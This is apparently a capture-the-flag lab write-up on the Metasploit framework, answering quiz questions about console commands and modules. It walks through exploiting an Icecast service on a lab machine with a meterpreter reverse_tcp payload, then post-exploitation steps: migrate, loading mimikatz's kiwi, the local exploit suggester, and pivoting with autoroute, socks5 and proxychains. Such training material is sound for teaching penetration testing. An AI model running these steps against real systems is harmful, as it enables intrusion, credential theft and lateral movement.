# Metasploit

## Intro

Metasploit, an open source pentesting framework, is a tool utilised by security engineers around the world. Metasploit us a collection of thoroughly tested exploits and auxillary/post-exploitation tools.

## Initialising...

Metasploit install had issues. They were fixed through removal and reinstalling with this script.
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

Initialise the database with `msfdb init`

Advanced options for the console can be found with `msfconsole -h`

**Questions**

    1. We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information? This will include the '-'

-q

    2. Cool! We've connected to the database, which type of database does Metasploit 5 use? 

`db_status`

PostgreSQL

## Rock 'em To The Core \[Commands\]

Using the help menu, learn the base commands. Help is found by typing 'help' in the metasploit console.

**Questions**

    1. The help menu has a very short one-character alias, what is it?

?

    2. Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?

search

    3. Once we've found the module we want to leverage, what command we use to select it as the active module?

use

    4. How about if we want to view information about either a specific module or just the active one we have selected?

info

    5. Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?

connect

    6. Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?

banner

    7. We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?

set

    8. Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally? 

setg

    9. Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.

get

    10. How about changing the value of a variable to null/no value?

unset

    11. When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?

spool

    12. Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file. 

save

## Modules For Every Occasion

Metasploit consists of six core modules that make up the bulk of the tools you will utilise within it.

**Questions**

    1. Easily the most common module utilized, which module holds all of the exploit code we will use?

exploit

    2. Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?

payload

    3. Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.

auxiliary

    4. One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?

post

    5. Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?

encoder

    6. Last but not least, which module is used with buffer overflow and ROP attacks?

NOP

    7. Not every module is loaded in by default, what command can we use to load different modules? 

load

## Move That Shell!

#### Metasploit Practical

Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command `db_nmap -sV 10.10.81.88`

`NOTE: the ip changes in this worked example as the exploit crashed the victim machine`

    1. What service does nmap identify running on port 135?

msrpc

Let's go ahead and see what information we have collected in the database. Try typing the command `hosts` into the msfconsole now.

```
address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.81.88             Unknown                    device
```

How about something else from the database, try the command `services` now.

```
Services
========

host         port   proto  name               state  info
----         ----   -----  ----               -----  ----
10.10.81.88  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.81.88  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.81.88  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup:
                                                     WORKGROUP
10.10.81.88  3389   tcp    ssl/ms-wbt-server  open
10.10.81.88  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.81.88  8000   tcp    http               open   Icecast streaming media server
10.10.81.88  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.81.88  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.81.88  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.81.88  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.81.88  49159  tcp    msrpc              open   Microsoft Windows RPC
10.10.81.88  49160  tcp    msrpc              open   Microsoft Windows RPC
```
One last thing, try the command `vulns` now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully. 
```
Vulnerabilities
===============

Timestamp  Host  Name  References
---------  ----  ----  ----------
```
Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type use followed by a unique string found within only the target exploit. For example, try this out now with the following command `use icecast`. 

    2. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start

exploit/windows/http/icecast_header

While that use command with the unique string can be incredibly useful that's not quite the exploit we want here. Let's now run the command `search multi/handler`.

Go ahead and run the command `use NUMBER_NEXT_TO  exploit/multi/handler `wherein the number will be what appears in that far left column (typically this will be 4 or 5). In this way, we can use our search results without typing out the full name/path of the module we want to use.

    3. What is the name of the column on the far left side of the console that shows up next to 'Name'?

\#

Now type the command `use NUMBER_FROM_PREVIOUS_QUESTION`. This is the short way to use modules returned by search results. 

Next, let's set the payload using this command `set PAYLOAD windows/meterpreter/reverse_tcp`. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command `set LHOST YOUR_IP_ON_TRYHACKME`. You might have to check your IP using the command ip addr, it will likely be your tun0 interface.

Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.

One last step before we can run our exploit. Run the command `set RHOSTS 10.10.103.33` to tell Metasploit which target to attack.

Once you're set those variables correctly, run the exploit now via either the command `exploit` or the command `run -j` to run this as a job.

Once we've started this, we can check all of the jobs running on the system by running the command `jobs`

After we've established our connection in the next task, we can list all of our sessions using the command sessions. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`

## We're In, Now What?

Now that we've got a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage! 

**Questions**

    1. First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command ps. What's the name of the spool service?

spoolsv.exe

    2. Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!

migrate

    3. Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?

getuid

    4. How about finding more information out about the system itself?

sysinfo

    5. This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it? 

load kiwi

    6. Let's go ahead and figure out the privileges of our current user, what command do we run?

getprivs

    7. What command do we run to transfer files to our victim computer?

upload

    8. How about if we want to run a Metasploit module?

run

    9. A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?

ipconfig

Let's go ahead and run a few post modules from Metasploit. First, let's run the command run post/windows/gather/checkvm. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.

```
meterpreter > run post/windows/gather/checkvm

[*] Checking if DARK-PC is a Virtual Machine ...
[+] This is a Xen Virtual Machine
```

Next, let's try: run post/multi/recon/local_exploit_suggester. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room Ice.

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.103.33 - Collecting local exploits for x86/windows...
[*] 10.10.103.33 - 37 exploit checks are being tried...
[+] 10.10.103.33 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.103.33 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.103.33 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.103.33 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.103.33 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.103.33 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.103.33 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.103.33 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.103.33 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: run post/windows/manage/enable_rdp

```
meterpreter > run post/windows/manage/enable_rdp

[-] Insufficient privileges, Remote Desktop Service was not modified
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210322164425_default_10.10.103.33_host.windows.cle_041389.txt
```

    10. One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell? 

shell

## Makin' Cisco Proud

Lets have a look at autorouting options available in metasploit. The victim may not have access to multiple network interfaces, however for these questions we will assume that it does.

**Questions**

    1. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.

`run autoroute -s 172.18.1.0 -n 255.255.255.0`

    2. Additionally, we can start a socks5 proxy server out of this session. Background our current meterpreter session and run the command `search server/socks5`. What is the full path to the socks5 auxiliary module?

auxiliary/server/socks5

    3. Once we've started a socks server we can modify our /etc/proxychains.conf file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with proxychains?

proxychains